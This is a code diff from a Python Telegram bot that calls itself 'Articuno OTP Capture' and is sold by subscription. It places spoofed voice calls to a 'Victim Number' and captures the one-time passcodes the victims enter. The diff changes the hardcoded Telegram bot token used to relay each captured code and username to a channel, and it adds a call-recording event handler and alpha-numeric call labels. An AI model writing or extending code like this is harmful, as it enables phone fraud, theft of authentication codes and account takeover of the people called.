@@ -1072,7 +1072,7 @@ def custom_prebuild_script_call(script_id,chatid):
             item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny")
             keyboard.add(item1,item2) 
             bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
-            requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
+            requests.post(f"""https://api.telegram.org/bot7289161960:AAGqVenb4JrHLzK60YKFBcmBmq3jdhMcpx0/sendMessage?chat_id=-1002076456397&text=
 🚀 Articuno OTP Capture 🚀
 Another Call Was Successful 👤
 
@@ -1086,8 +1086,6 @@ Powered By:- @ArticunoOtpBot 🔐""")
     return 'Webhook received successfully!', 200
 
 #--------------------------------------------------------------------------------------------------------------------------------
-
-
 
 
 #--------------------------------ALPHA---CALL WEBHOOK-------------------------------------------------------
@@ -1156,6 +1154,9 @@ def aplha_prebuild_script_call(script_id,chatid):
     
     if event == "call.ringing":  
             callhangbutton(chatid)
+
+    elif event == "recording.started":  
+            bot.send_message(chatid,f"""*Alpha-Numeric Detection started ⏺️*""",parse_mode='markdown')
             
         
     elif event == "call.answered":
@@ -1168,7 +1169,7 @@ def aplha_prebuild_script_call(script_id,chatid):
             requests.post(url1, json=data)
             bot.send_message(chatid,f"""*Call has been answered 📱*""",parse_mode='markdown')
 
-        
+    
 
     elif event == "call.hangup":
             try:
@@ -1243,14 +1244,14 @@ def aplha_prebuild_script_call(script_id,chatid):
             item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny_alpha")
             keyboard.add(item1,item2) 
             bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
-            requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
+            requests.post(f"""https://api.telegram.org/bot7289161960:AAGqVenb4JrHLzK60YKFBcmBmq3jdhMcpx0/sendMessage?chat_id=-1002076456397&text=
 🚀 Articuno OTP Capture 🚀
 Another Call Was Successful 👤
 
 Custom OTP:- {otp2} ✅
 Username:- @{voices[12][0:3]+"****"+voices[12][-3:]} 🆔
 Service Name:- {custom_sc_src[2]} ⌛️
-Call Type:- CustomCall 📲
+Call Type:- Alpha-Numeric 📲
 
 Powered By:- @ArticunoOtpBot 🔐""")
          
@@ -1367,7 +1368,7 @@ Please wait verifying your inputes 🧑‍💻*""",parse_mode='markdown')
                         else:
                             bot.send_message(message.from_user.id, """* Custom script not found! \n Create First -> /customscript *""",parse_mode='markdown')
                     except:
-                        bot.send_message(message.from_user.id, f"*Somthing went wrong.\n/customcall <Victim Number> <Spoof Number> <Script Id> <voice>*",parse_mode='markdown')
+                        bot.send_message(message.from_user.id, f"*Somthing went wrong.\n/alphacall <Victim Number> <Spoof Number> <Script Id> <voice>*",parse_mode='markdown')
             else:
                    bot.send_message(message.from_user.id, "*🚫Buy Subscription.🚫*",parse_mode='markdown')  
                    delete_data(id) 
